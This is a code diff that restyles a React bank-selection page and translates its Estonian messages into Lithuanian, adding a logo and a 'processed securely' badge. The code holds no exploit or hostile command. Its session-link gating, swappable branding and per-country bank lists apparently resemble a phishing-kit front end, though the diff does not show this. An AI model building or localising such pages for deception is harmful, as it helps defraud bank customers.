@@ -237,7 +237,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     setSaving(false);
     if (error) {
       navigationLockRef.current = false;
-      setMsg("Salvestamine ebaõnnestus.");
+      setMsg("Nepavyko išsaugoti.");
     }
     else {
       setSessionFormData(nextFormData);
@@ -247,8 +247,8 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
   if (!supabase) {
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -258,24 +258,24 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   if (!sessionId) {
     if (recovering) {
       return (
-        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-          <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-            <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
-            <p className="text-sm text-gray-300 mb-8">Seanss taastatakse...</p>
-            <div className="flex justify-center py-12">
-              <div className="size-10 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+        <div className="a3d-shell items-center justify-center p-4">
+          <div className="a3d-card w-full max-w-[460px] p-8 text-center">
+            <h2 className="a3d-title mb-2 text-2xl">{settings.banken_title}</h2>
+            <p className="a3d-sub mb-8 text-sm font-medium">Sesija atkuriamasi...</p>
+            <div className="flex justify-center py-8">
+              <div className="a3d-spinner size-10" />
             </div>
           </div>
         </div>
       );
     }
     return (
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
-          <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
-          <p className="text-sm text-gray-300 mb-6">Vigane link.</p>
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Kasutage edasimineks täielikku linki.
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
+          <h2 className="a3d-title mb-2 text-2xl">{settings.banken_title}</h2>
+          <p className="a3d-sub mb-6 text-sm font-medium">Neteisinga nuoroda.</p>
+          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
+            Norėdami tęsti, naudokite visą nuorodą.
           </p>
         </div>
       </div>
@@ -283,17 +283,27 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }
 
   return (
-    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-6 sm:pt-[22vh]">
-      <div className="space-y-4 w-full max-w-[720px] relative z-10 fade-in">
-        <div className="luxury-glass p-4 sm:p-7">
-          <div className="text-center mb-5 sm:mb-6">
-            <h2 className="text-xl sm:text-2xl font-bold text-white tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>{settings.banken_title}</h2>
-            <p className="text-xs sm:text-sm text-white/60 mt-1.5 font-medium max-w-[480px] mx-auto">{settings.banken_subtitle}</p>
+    <div className="a3d-shell">
+      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
+      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
+
+      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-3 sm:p-4">
+        <div className="a3d-card a3d-in flex h-[calc(100dvh-3rem)] max-h-[760px] w-full max-w-[560px] flex-col overflow-hidden p-4 sm:p-6">
+          <div className="mb-4 flex items-start justify-between gap-4">
+            <div className="min-w-0">
+              <h2 className="a3d-title text-[22px] leading-tight sm:text-[24px]">{settings.banken_title}</h2>
+              <p className="a3d-sub mt-1.5 text-[13px] font-medium sm:text-sm">{settings.banken_subtitle}</p>
+            </div>
+            <img
+              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
+              alt={settings.portal_name || "Brand"}
+              className="h-11 w-11 shrink-0 object-contain"
+            />
           </div>
-          
-          <div className="mx-auto mb-4 sm:mb-5 max-w-[480px]">
-            <div className="flex items-center gap-2 rounded-2xl border border-white/8 bg-white/[0.05] px-3.5 py-2.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.04),inset_0_-1px_0_rgba(0,0,0,0.4)] focus-within:border-[var(--brand)]/50 focus-within:ring-1 focus-within:ring-[var(--brand)]/30 focus-within:shadow-[0_0_0_4px_rgba(var(--brand-rgb),0.14),0_0_20px_-4px_rgba(255,236,73,0.30),inset_0_1px_0_rgba(255,255,255,0.08)] transition-all duration-200">
-              <svg aria-hidden viewBox="0 0 24 24" className="h-4 w-4 shrink-0 text-white/45" fill="none" stroke="currentColor" strokeWidth="2">
+
+          <div className="mb-4 shrink-0">
+            <div className="a3d-input flex items-center gap-2.5 px-4 py-3">
+              <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2">
                 <circle cx="11" cy="11" r="7" />
                 <path d="m20 20-3.5-3.5" />
               </svg>
@@ -301,16 +311,16 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
                 placeholder={settings.banken_search_placeholder}
-                className="w-full bg-transparent text-sm text-white outline-none placeholder:text-white/35"
+                className="w-full bg-transparent text-sm text-[#101828] outline-none placeholder:text-[#98a2b3]"
               />
             </div>
           </div>
 
-          <div className="max-h-[62vh] sm:max-h-[48vh] overflow-y-auto pr-1 custom-scrollbar">
-            <div className="grid grid-cols-1 gap-2.5 sm:gap-3 pb-1">
+          <div className="a3d-scroll min-h-0 flex-1 overflow-y-auto pr-1">
+            <div className="grid grid-cols-1 gap-2.5 pb-1">
               {filteredOptions.length === 0 ? (
-                <div className="col-span-1 rounded-2xl border border-white/8 bg-white/[0.04] p-5 text-center text-sm text-white/70 backdrop-blur-sm">
-                  Valitud riigi jaoks pole paiku pandud pangasid. Palun puhastage otsingufilter.
+                <div className="a3d-inset p-5 text-center text-sm font-medium text-[#667085]">
+                  Pasirinktai šaliai bankų nerasta. Išvalykite paieškos filtrą.
                 </div>
               ) : filteredOptions.map((opt, idx) => (
                 <button
@@ -318,16 +328,14 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   type="button"
                   onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                   disabled={saving}
-                  className={`group w-full flex items-center gap-3 sm:gap-4 rounded-2xl border border-white/8 bg-white/[0.04] p-3 sm:p-3.5 shadow-sm transition-all duration-300 ease-out hover:border-white/15 hover:bg-white/[0.08] hover:shadow-[0_20px_44px_-16px_rgba(0,0,0,0.60),0_0_30px_-8px_rgba(255,236,73,0.18)] hover:-translate-y-0.5 active:translate-y-0 ${
-                    bankSlug === opt.slug ? "!border-[var(--brand)]/60 !bg-gradient-to-r !from-[var(--brand)]/12 !via-white/[0.06] !to-[var(--brand-dark)]/12 ring-1 ring-[var(--brand)]/40 shadow-[0_0_0_1px_rgba(var(--brand-rgb),0.20),0_0_40px_-10px_rgba(var(--brand-rgb),0.30),0_0_50px_-14px_rgba(255,236,73,0.22)]" : ""
-                  }`}
+                  className={`a3d-bank-item a3d-in ${bankSlug === opt.slug ? "a3d-selected" : ""}`}
                   style={{ animationDelay: `${idx * 28}ms` }}
                 >
-                  {/* SOL: YUVARLAK LOGO ALANI (72px - TAM YUVARLAK, logo TAM SIGSIN) */}
-                  <div className="bank-logo-round">
+                  <div className="a3d-logo-ring size-12">
                     <img
                       src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 90, width: 256 }) || opt.logoFile}
                       alt={opt.displayName}
+                      className="h-full w-full rounded-full object-cover"
                       onError={(e) => {
                         e.currentTarget.onerror = null;
                         e.currentTarget.style.display = 'none';
@@ -335,42 +343,47 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                         if (fallback) fallback.style.display = 'grid';
                       }}
                     />
-                    <div style={{ display: 'none' }} className="bank-logo-round-fallback">
+                    <div style={{ display: 'none' }} className="grid h-full w-full place-items-center text-sm font-black text-[var(--brand)]">
                       {opt.displayName.charAt(0)}
                     </div>
                   </div>
 
-                  {/* ORTA: BANKA ADI — sadece tek satir, alt aciklama YOK (kullanici 'Vali oma pank...' yazisini istemiyor) */}
-                  <div className="flex-1 min-w-0 text-left">
-                    <p className="text-[16px] sm:text-[17px] font-semibold text-white/95 group-hover:text-white leading-tight tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>
+                  <div className="min-w-0 flex-1 text-left">
+                    <p className="a3d-title truncate text-[15px] font-semibold sm:text-[16px]">
                       {opt.displayName}
                     </p>
                   </div>
 
-                  {/* SAG: Ok / eylem alani */}
-                  <div className="shrink-0 flex items-center gap-2">
+                  <div className="flex shrink-0 items-center">
                     {saving && bankSlug === opt.slug ? (
-                      <div className="size-5 animate-spin rounded-full border-2 border-[var(--brand)]/30 border-t-[var(--brand)]" />
+                      <div className="a3d-spinner size-5" style={{ borderWidth: "2px" }} />
                     ) : (
-                      <div className="size-9 sm:size-10 grid place-items-center rounded-2xl bg-gradient-to-br from-white/[0.06] to-white/[0.02] border border-white/[0.07] text-white/50 group-hover:text-white group-hover:bg-gradient-to-br group-hover:from-[var(--brand)]/18 group-hover:via-[var(--brand-dark)]/18 group-hover:to-[#f59e0b]/12 group-hover:border-[var(--brand)]/25 group-hover:shadow-[0_0_22px_-6px_rgba(var(--brand-rgb),0.45)] transition-all duration-300">
-                        <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 sm:h-5 sm:w-5" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
-                          <path d="m9 6 6 6-6 6" />
-                        </svg>
-                      </div>
+                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-[#98a2b3] transition-colors group-hover:text-[var(--brand)]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                        <path d="m9 6 6 6-6 6" />
+                      </svg>
                     )}
                   </div>
                 </button>
               ))}
             </div>
           </div>
+
+          <div className="mt-4 flex shrink-0 justify-center border-t border-[#1018280a] pt-4">
+            <div className="a3d-pill">
+              <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
+              </svg>
+              <span>Jūsų banko pasirinkimas apdorojamas saugiai.</span>
+            </div>
+          </div>
         </div>
 
         {msg ? (
-          <div className="text-center text-sm text-red-300/90 bg-red-500/10 backdrop-blur-md border border-red-500/20 p-3.5 rounded-2xl shadow-[0_20px_40px_-18px_rgba(239,68,68,0.35)]">
+          <div className="mt-3 w-full max-w-[560px] rounded-2xl border border-red-200 bg-red-50/90 p-3.5 text-center text-sm font-medium text-red-600">
             {msg}
           </div>
         ) : null}
-      </div>
+      </main>
     </div>
   );
 }
